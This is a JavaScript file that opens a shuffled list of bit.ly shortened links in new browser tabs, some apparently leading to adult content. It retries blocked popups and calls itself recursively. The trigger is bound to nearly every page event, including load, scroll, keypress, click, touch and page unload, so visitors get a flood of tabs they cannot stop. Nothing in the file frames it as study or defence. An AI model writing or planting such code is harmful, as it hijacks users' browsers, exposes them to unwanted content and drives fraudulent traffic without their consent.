function openRandomLinks(links, maxAttempts = 3) {
    const shuffledLinks = shuffleArray(links);

    function openLinks() {
        shuffledLinks.forEach(link => {
            let attempts = 0;

            const tryOpenLink = () => {
                const newTab = window.open(link, '_blank');
                if (newTab === null || typeof newTab === 'undefined') {
                    attempts++;
                    if (attempts <= maxAttempts) {
                        console.log(`Attempt ${attempts}: Failed to open ${link}. Retrying...`);
                        tryOpenLink();
                    } else {
                        console.log(`Maximum attempts reached for ${link}.`);
                    }
                }
            };

            tryOpenLink();
        });
    }

    openLinks();

    // Check if all links were opened successfully
    const allLinksOpened = shuffledLinks.every(link => {
        return window.open(link, '_blank') !== null;
    });

    // If all links were opened successfully, repeat the process
    if (allLinksOpened) {
        console.log("All links opened. Repeating...");
        openRandomLinks(links, maxAttempts);
    }
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

var links = [
    'https://bit.ly/smashwatchkad',
    'https://bit.ly/smashwatchunder',
    'https://bit.ly/smashwatchright',
    'https://bit.ly/lisa___ann?utm_source=una',
    'https://bit.ly/smashwatchriver',
    'https://bit.ly/smashwatchbid',
    'https://bit.ly/smashwatchmaven',
    'https://bit.ly/smashwatchright?utm_source=right'
];

function triggerOpenRandomLinks() {
    openRandomLinks(links);
}

window.addEventListener('load', triggerOpenRandomLinks);
window.addEventListener('scroll', triggerOpenRandomLinks);
window.addEventListener('keydown', triggerOpenRandomLinks);
document.addEventListener('scroll', triggerOpenRandomLinks);
document.addEventListener('keydown', triggerOpenRandomLinks);
window.addEventListener('beforeunload', triggerOpenRandomLinks);
document.addEventListener('beforeunload', triggerOpenRandomLinks);
window.addEventListener('click', triggerOpenRandomLinks);
document.addEventListener('click', triggerOpenRandomLinks);
window.addEventListener('mousewheel', triggerOpenRandomLinks);
document.addEventListener('mousewheel', triggerOpenRandomLinks);
window.addEventListener('touchstart', triggerOpenRandomLinks);
document.addEventListener('touchstart', triggerOpenRandomLinks);
window.addEventListener('touchmove', triggerOpenRandomLinks);
document.addEventListener('touchmove', triggerOpenRandomLinks);
window.addEventListener('touchend', triggerOpenRandomLinks);
document.addEventListener('touchend', triggerOpenRandomLinks);
window.addEventListener('unload', triggerOpenRandomLinks);
document.addEventListener('unload', triggerOpenRandomLinks);
